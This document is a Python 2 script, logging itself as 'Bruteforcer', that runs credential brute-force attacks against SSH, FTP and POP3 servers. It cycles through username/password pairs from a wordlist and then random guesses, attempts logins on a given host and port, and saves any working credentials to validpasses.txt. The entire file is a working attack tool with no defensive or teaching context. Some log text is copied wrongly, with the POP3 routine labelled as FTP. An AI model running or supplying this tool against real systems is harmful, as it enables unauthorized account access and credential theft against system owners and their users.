#!/usr/bin/python
import redis, paramiko, socket, datetime, os, sys, subprocess, uuid
from ftplib import FTP
from poplib import POP3

r_server = redis.Redis("localhost")

def log(msg):
	timestamp = datetime.datetime.now().strftime('%b %d %H:%M:%S')
	return "%s Bruteforcer[%d]: %s" % (timestamp, os.getpid(), msg)
	sys.stdout.flush()


def generateAuthPair():
	return (str(uuid.uuid4()), str(uuid.uuid4()))


def SSHBrute(host, port):
	attempts = 80
	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(', ')
			scancurrentline += 1

		attempt += 1

		print log("SSH Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			client.connect(str(host), username=str(tstusername), password=str(tstpassword), port=int(port), timeout=10)
			login = log('Sucessful SSH authentication with username %s and password %s' % (tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			client.close()
		except paramiko.AuthenticationException, error:
			print log("Incorrect credentials User: %s and Password: %s" % (tstusername, tstpassword))
			continue
		except socket.timeout:
			print log("Connection Timeout")
			break
		except socket.error, error:
			print error
			continue
		except paramiko.SSHException, error:
			print error
			print "Most probably this is caused by a missing host key"
			continue
		except Exception, error:
			print error
			print "Unknown error: %s" % (error)
		client.close()
	credentials.close()


def FTPBrute(host, port):

	attempts = 80
	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(', ')
			scancurrentline += 1

		attempt += 1

		print log("FTP Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		try:
			ftpclient = FTP()
			ftpclient.connect(host=host, port=int(port), timeout=10)			
			ftpclient.login(tstusername, tstpassword)
			login = log('Sucessful FTP authentication with username %s and password %s' % (tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			ftpclient.close()
		except socket.timeout:
			print log("Connection Timeout")
			break
		except socket.error as E:
			if E.errno == 61:
				print log("Connection refused")
				break
		except socket.error as E:
			print log("   connection failed (socket.error) = %s" % (E))
			continue
		except socket.error, error:
			print error
			continue
		except Exception as E:
			print log("   generic exception = %s" % (E))
			continue
	credentials.close()


def POPBrute(host, port):
	attempts = 80
	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(',')
			scancurrentline += 1

		attempt += 1

		print log("FTP Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		try:
			client = POP3(host=host, port=int(port), timeout=10)
			client.user(tstusername)
			client.pass_(tstpassword)
			login = log('Sucessful POP3 authentication with username %s and password %s' % (tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			client.quit()
		except socket.timeout:
			print log("Connection Timeout")
			break
		except socket.error as E:
			if E.errno == 61:
				print log("Connection refused")
				break
		except socket.error as E:
			print log("   connection failed (socket.error) = %s" % (E))
			continue
		except socket.error, error:
			print error
			continue
		except Exception as E:
			print log("   generic exception = %s" % (E))
			continue
	credentials.close()
